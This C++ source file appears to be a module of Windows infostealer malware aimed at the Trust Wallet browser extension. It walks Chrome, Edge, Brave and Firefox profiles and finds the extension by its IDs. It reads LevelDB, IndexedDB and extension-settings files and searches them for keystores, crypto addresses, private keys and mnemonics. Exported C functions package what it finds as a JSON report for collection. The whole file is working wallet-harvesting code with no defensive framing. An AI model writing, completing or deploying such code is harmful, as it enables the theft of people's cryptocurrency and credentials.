#include <windows.h>
#include <shlobj.h>
#include <string>
#include <vector>
#include <sstream>
#include <fstream>
#include "../common.h"
#include "../logger/file_logger.h"

// External logging functions
extern "C" {
    void LogInfo(const char* message);
    void LogError(const char* message);
    void LogWarning(const char* message);
}

class TrustWalletExtractor {
private:
    struct TrustWallet {
        std::string browser;
        std::string profile;
        std::vector<std::string> keystores;
        std::vector<std::string> addresses;
        std::string password;
        bool hasPrivateKeys = false;
    };

    std::vector<TrustWallet> wallets;

public:
    bool FindTrustWallets() {
        LogInfo("[Trust] Searching for Trust Wallet installations...");
        
        std::vector<std::string> browsers = {
            "Google\\Chrome",
            "Microsoft\\Edge",
            "Mozilla\\Firefox",
            "BraveSoftware\\Brave-Browser"
        };
        
        WCHAR appDataPath[MAX_PATH];
        if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, appDataPath))) {
            std::wstring basePathW = appDataPath;
            std::string basePath(basePathW.begin(), basePathW.end());
            
            for (const auto& browser : browsers) {
                std::string browserPath = basePath + "\\" + browser + "\\User Data";
                ScanBrowserProfiles(browserPath, browser);
            }
        }
        
        LogInfo(("[Trust] Found " + std::to_string(wallets.size()) + " Trust Wallet installations").c_str());
        return !wallets.empty();
    }

private:
    void ScanBrowserProfiles(const std::string& browserPath, const std::string& browserName) {
        WIN32_FIND_DATAA findData;
        std::string searchPath = browserPath + "\\*";
        
        HANDLE hFind = FindFirstFileA(searchPath.c_str(), &findData);
        if (hFind == INVALID_HANDLE_VALUE) return;
        
        do {
            if ((findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) && 
                findData.cFileName[0] != '.') {
                
                std::string profilePath = browserPath + "\\" + findData.cFileName;
                ScanTrustWalletData(profilePath, browserName, findData.cFileName);
            }
        } while (FindNextFileA(hFind, &findData));
        
        FindClose(hFind);
    }
    
    void ScanTrustWalletData(const std::string& profilePath, const std::string& browser, const std::string& profile) {
        // Trust Wallet extension IDs
        std::vector<std::string> trustExtensions = {
            "egjidjbpglichdcondbcbdnbeeppgdph", // Trust Wallet
            "acmacodkjbdgmoleebolmdjonilkdbch"  // Trust Wallet (alternative)
        };
        
        for (const auto& extId : trustExtensions) {
            std::string extPath = profilePath + "\\Extensions\\" + extId;
            if (PathExistsA(extPath.c_str())) {
                ScanTrustExtensionData(extPath, browser, profile);
            }
        }
    }
    
    void ScanTrustExtensionData(const std::string& extensionPath, const std::string& browser, const std::string& profile) {
        LogInfo(("[Trust] Scanning extension data in " + extensionPath).c_str());
        
        TrustWallet wallet;
        wallet.browser = browser;
        wallet.profile = profile;
        
        // Look for keystore files
        ScanForKeystores(extensionPath, wallet);
        
        // Look for Local Storage
        ScanLocalStorage(extensionPath, wallet);
        
        if (!wallet.keystores.empty() || !wallet.addresses.empty() || wallet.hasPrivateKeys) {
            wallets.push_back(wallet);
            LogInfo("[Trust] Trust Wallet data collected");
        }
    }
    
    void ScanForKeystores(const std::string& basePath, TrustWallet& wallet) {
        std::vector<std::string> searchPaths = {
            basePath + "\\Local Storage\\leveldb",
            basePath + "\\IndexedDB",
            basePath + "\\Local Extension Settings"
        };
        
        for (const auto& path : searchPaths) {
            if (PathExistsA(path.c_str())) {
                ScanDirectoryForKeys(path, wallet);
            }
        }
    }
    
    void ScanDirectoryForKeys(const std::string& directory, TrustWallet& wallet) {
        WIN32_FIND_DATAA findData;
        std::string searchPath = directory + "\\*";
        
        HANDLE hFind = FindFirstFileA(searchPath.c_str(), &findData);
        if (hFind == INVALID_HANDLE_VALUE) return;
        
        do {
            if (!(findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
                std::string filePath = directory + "\\" + findData.cFileName;
                std::string fileName = findData.cFileName;
                
                // Look for keystore patterns
                if (fileName.find("keystore") != std::string::npos ||
                    fileName.find("wallet") != std::string::npos ||
                    fileName.find(".json") != std::string::npos) {
                    
                    if (AnalyzeKeystoreFile(filePath, wallet)) {
                        wallet.keystores.push_back(filePath);
                    }
                }
            }
        } while (FindNextFileA(hFind, &findData));
        
        FindClose(hFind);
    }
    
    bool AnalyzeKeystoreFile(const std::string& filePath, TrustWallet& wallet) {
        std::ifstream file(filePath, std::ios::binary);
        if (!file.is_open()) return false;
        
        std::string content((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
        file.close();
        
        // Look for Trust Wallet specific patterns
        if (content.find("trustwallet") != std::string::npos ||
            content.find("\"address\":") != std::string::npos ||
            content.find("\"crypto\":") != std::string::npos ||
            content.find("\"kdf\":") != std::string::npos) {
            
            ExtractAddressesFromContent(content, wallet);
            return true;
        }
        
        return false;
    }
    
    void ScanLocalStorage(const std::string& extensionPath, TrustWallet& wallet) {
        std::string localStoragePath = extensionPath + "\\Local Storage\\leveldb";
        
        if (PathExistsA(localStoragePath.c_str())) {
            WIN32_FIND_DATAA findData;
            std::string searchPath = localStoragePath + "\\*.ldb";
            
            HANDLE hFind = FindFirstFileA(searchPath.c_str(), &findData);
            if (hFind != INVALID_HANDLE_VALUE) {
                do {
                    std::string filePath = localStoragePath + "\\" + findData.cFileName;
                    AnalyzeLevelDBFile(filePath, wallet);
                } while (FindNextFileA(hFind, &findData));
                FindClose(hFind);
            }
        }
    }
    
    void AnalyzeLevelDBFile(const std::string& filePath, TrustWallet& wallet) {
        std::ifstream file(filePath, std::ios::binary);
        if (!file.is_open()) return;
        
        std::string content((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
        file.close();
        
        // Look for wallet data in LevelDB
        ExtractAddressesFromContent(content, wallet);
        ExtractPrivateKeysFromContent(content, wallet);
    }
    
    void ExtractAddressesFromContent(const std::string& content, TrustWallet& wallet) {
        // Extract Ethereum addresses (0x...)
        size_t pos = 0;
        while ((pos = content.find("0x", pos)) != std::string::npos) {
            if (pos + 42 <= content.length()) {
                std::string address = content.substr(pos, 42);
                if (IsValidEthereumAddress(address)) {
                    wallet.addresses.push_back(address);
                }
            }
            pos += 2;
        }
        
        // Extract Bitcoin addresses
        ExtractBitcoinAddresses(content, wallet);
        
        // Extract other crypto addresses
        ExtractOtherAddresses(content, wallet);
    }
    
    void ExtractPrivateKeysFromContent(const std::string& content, TrustWallet& wallet) {
        // Look for private key patterns
        std::vector<std::string> keyPatterns = {
            "\"privateKey\":",
            "\"key\":",
            "\"secret\":",
            "\"mnemonic\":"
        };
        
        for (const auto& pattern : keyPatterns) {
            size_t pos = content.find(pattern);
            if (pos != std::string::npos) {
                // Extract key data (implementation would depend on format)
                // NOTE: Do not log sensitive data findings for security
                wallet.hasPrivateKeys = true;
                break; // Found at least one, stop searching
            }
        }
    }
    
    void ExtractBitcoinAddresses(const std::string& content, TrustWallet& wallet) {
        // Look for Bitcoin address patterns (1..., 3..., bc1...)
        std::vector<std::string> patterns = {"1", "3", "bc1"};
        
        for (const auto& pattern : patterns) {
            size_t pos = 0;
            while ((pos = content.find(pattern, pos)) != std::string::npos) {
                // Extract potential Bitcoin address
                std::string address = ExtractAddressAtPosition(content, pos);
                if (IsValidBitcoinAddress(address)) {
                    wallet.addresses.push_back(address);
                }
                pos++;
            }
        }
    }
    
    void ExtractOtherAddresses(const std::string& content, TrustWallet& wallet) {
        // Extract other cryptocurrency addresses (BNB, etc.)
        std::vector<std::string> patterns = {
            "bnb1",  // Binance Chain
            "cosmos1", // Cosmos
            "terra1",  // Terra
        };
        
        for (const auto& pattern : patterns) {
            size_t pos = 0;
            while ((pos = content.find(pattern, pos)) != std::string::npos) {
                std::string address = ExtractAddressAtPosition(content, pos);
                if (address.length() > 20) { // Basic validation
                    wallet.addresses.push_back(address);
                }
                pos += pattern.length();
            }
        }
    }
    
    std::string ExtractAddressAtPosition(const std::string& content, size_t pos) {
        size_t end = pos;
        while (end < content.length() && 
               (std::isalnum(content[end]) || content[end] == '_' || content[end] == '-')) {
            end++;
        }
        return content.substr(pos, end - pos);
    }
    
    bool IsValidEthereumAddress(const std::string& address) {
        if (address.length() != 42 || address.substr(0, 2) != "0x") {
            return false;
        }
        
        for (size_t i = 2; i < address.length(); i++) {
            if (!std::isxdigit(address[i])) {
                return false;
            }
        }
        return true;
    }
    
    bool IsValidBitcoinAddress(const std::string& address) {
        if (address.length() < 26 || address.length() > 62) {
            return false;
        }
        
        // Basic validation for Bitcoin address format
        if (address[0] == '1' || address[0] == '3') {
            return address.length() >= 26 && address.length() <= 35;
        } else if (address.substr(0, 3) == "bc1") {
            return address.length() >= 42 && address.length() <= 62;
        }
        
        return false;
    }
    
    bool PathExistsA(const std::string& path) {
        DWORD attr = GetFileAttributesA(path.c_str());
        return (attr != INVALID_FILE_ATTRIBUTES);
    }

public:
    std::string GenerateReport() {
        std::stringstream report;
        report << "{\"trust_wallets\":[";
        
        for (size_t i = 0; i < wallets.size(); i++) {
            if (i > 0) report << ",";
            
            report << "{";
            report << "\"browser\":\"" << wallets[i].browser << "\",";
            report << "\"profile\":\"" << wallets[i].profile << "\",";
            report << "\"keystores\":[";
            
            for (size_t j = 0; j < wallets[i].keystores.size(); j++) {
                if (j > 0) report << ",";
                report << "\"" << wallets[i].keystores[j] << "\"";
            }
            
            report << "],\"addresses\":[";
            
            for (size_t j = 0; j < wallets[i].addresses.size(); j++) {
                if (j > 0) report << ",";
                report << "\"" << wallets[i].addresses[j] << "\"";
            }
            
            report << "]}";
        }
        
        report << "]}";
        return report.str();
    }
};

// Global instance
static std::unique_ptr<TrustWalletExtractor> g_trustExtractor;

extern "C" {
    bool InitializeTrustWalletExtractor() {
        try {
            g_trustExtractor = std::make_unique<TrustWalletExtractor>();
            LogInfo("[Trust] Trust Wallet extractor initialized");
            return true;
        } catch (...) {
            LogError("[Trust] Failed to initialize Trust Wallet extractor");
            return false;
        }
    }
    
    bool ExtractTrustWalletData() {
        if (!g_trustExtractor) {
            if (!InitializeTrustWalletExtractor()) {
                return false;
            }
        }
        
        LogInfo("[Trust] Starting Trust Wallet data extraction");
        
        try {
            bool found = g_trustExtractor->FindTrustWallets();
            
            if (found) {
                LogInfo("[Trust] Trust Wallet data extraction completed successfully");
            } else {
                LogInfo("[Trust] No Trust Wallet installations found");
            }
            
            return found;
        } catch (...) {
            LogError("[Trust] Exception during Trust Wallet extraction");
            return false;
        }
    }
    
    const char* GetTrustWalletReport() {
        if (!g_trustExtractor) {
            return "{\"error\":\"Trust Wallet extractor not initialized\"}";
        }
        
        try {
            static std::string report = g_trustExtractor->GenerateReport();
            return report.c_str();
        } catch (...) {
            LogError("[Trust] Failed to generate Trust Wallet report");
            return "{\"error\":\"Failed to generate report\"}";
        }
    }
    
    void CleanupTrustWalletExtractor() {
        if (g_trustExtractor) {
            g_trustExtractor.reset();
            LogInfo("[Trust] Trust Wallet extractor cleaned up");
        }
    }
}